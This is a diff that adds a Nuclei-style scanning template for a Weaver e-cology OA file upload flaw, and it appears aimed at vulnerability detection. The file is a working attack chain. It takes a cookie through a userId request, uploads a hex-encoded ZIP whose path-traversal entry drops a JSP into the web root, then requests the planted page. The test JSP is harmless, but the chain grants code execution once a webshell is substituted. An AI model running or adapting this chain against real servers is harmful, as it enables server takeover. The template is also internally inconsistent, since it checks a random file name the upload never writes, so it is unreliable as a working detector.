@@ -1,0 +1,50 @@
+id: weaver-oa-file-upload
+info:
+  name: Weaver e-cology OA File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    There is a file upload vulnerability in Weaver OA check API, which allows attackers to upload webshells and obtain server permissions.
+  tags: file-upload, getshell
+  reference:
+    - https://www.weaver.com.cn
+variables:
+  random_filename: '{{rand_base(19)}}'
+  payload: |
+    504b0304140000000000fd8d95524c6c513120000000200000002e0000002e2e2f2e2e2f2e2e2f2e2e2f6d6f62696c656d6f64652f6d6f64654c69737449647355736572436f72642e6a73703c256f75742e7072696e746c6e282268656c6c6f2c776f726c6422293b253e0a504b01021403140000000000fd8d95524c6c513120000000200000002e0000000000000000000000a481000000002e2e2f2e2e2f2e2e2f2e2e2f6d6f62696c656d6f64652f6d6f64654c69737449647355736572436f72642e6a7370504b050600000000010001005c0000006c0000000000
+http:
+  - raw:
+      - |
+        POST /mobilemode/showdata.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        userId=21
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(header, 'Set-Cookie')
+          - contains(body, '/spa/edc/static4mobile/index.html')
+    extractors:
+      - type: regex
+        name: cookie
+        internal: true
+        regex:
+          - '(?i)Set-Cookie: (.*?);'
+  - raw:
+      - |
+        POST /api/ec/tool/validate/check HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{cookie}}
+        Content-Length: {{len(payload)}}
+
+        {{hex_decode(payload)}}
+  - raw:
+      - |
+        GET /mobilemode/{{random_filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        words:
+          - "hello,world"
+    matchers-condition: and
